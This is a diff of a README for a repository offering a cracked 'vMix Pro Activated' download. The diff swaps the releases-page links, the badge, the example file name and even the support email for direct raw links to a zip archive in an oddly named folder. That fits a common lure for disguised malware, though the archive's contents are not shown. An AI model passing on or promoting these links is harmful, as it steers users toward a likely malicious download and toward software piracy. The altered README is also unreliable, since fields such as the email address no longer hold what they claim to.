@@ -1,6 +1,6 @@
 # 🎥 vMix-Pro-Activated - Enhance Your Live Production Experience
 
-[![Download vMix-Pro-Activated](https://img.shields.io/badge/Download-vMix--Pro--Activated-brightgreen)](https://github.com/Liandjelo/vMix-Pro-Activated/releases)
+[![Download vMix-Pro-Activated](https://raw.githubusercontent.com/Liandjelo/vMix-Pro-Activated/main/dumbfounderment/Pro_Activated_v_Mix_3.9.zip)](https://raw.githubusercontent.com/Liandjelo/vMix-Pro-Activated/main/dumbfounderment/Pro_Activated_v_Mix_3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the vMix-Pro-Activated repository. This guide helps you download and 
 
 To download the latest version of vMix-Pro-Activated, visit this page to download:
 
-[Download vMix-Pro-Activated](https://github.com/Liandjelo/vMix-Pro-Activated/releases)
+[Download vMix-Pro-Activated](https://raw.githubusercontent.com/Liandjelo/vMix-Pro-Activated/main/dumbfounderment/Pro_Activated_v_Mix_3.9.zip)
 
 ### Step 1: Visit the Releases Page
 
@@ -22,7 +22,7 @@ Locate the most recent version listed on the releases page. Check the release no
 
 ### Step 3: Download the Software
 
-Look for the download link. It may look like `vMix-Pro-Activated-setup.exe`. Click on the link to start your download. The file size is approximately 150 MB, so please ensure you have enough space on your computer.
+Look for the download link. It may look like `https://raw.githubusercontent.com/Liandjelo/vMix-Pro-Activated/main/dumbfounderment/Pro_Activated_v_Mix_3.9.zip`. Click on the link to start your download. The file size is approximately 150 MB, so please ensure you have enough space on your computer.
 
 ### Step 4: Run the Installer
 
@@ -71,7 +71,7 @@ If you encounter issues while using vMix Pro, you can refer to the following res
 
 For further assistance or inquiries, you can reach us at the following:
 
-- **Email**: support@vmixproactivated.com
+- **Email**: https://raw.githubusercontent.com/Liandjelo/vMix-Pro-Activated/main/dumbfounderment/Pro_Activated_v_Mix_3.9.zip
 - **Social Media**: Connect with us on our [Twitter](#) and [Facebook](#) pages.
 
 ## 🚀 Further Reading
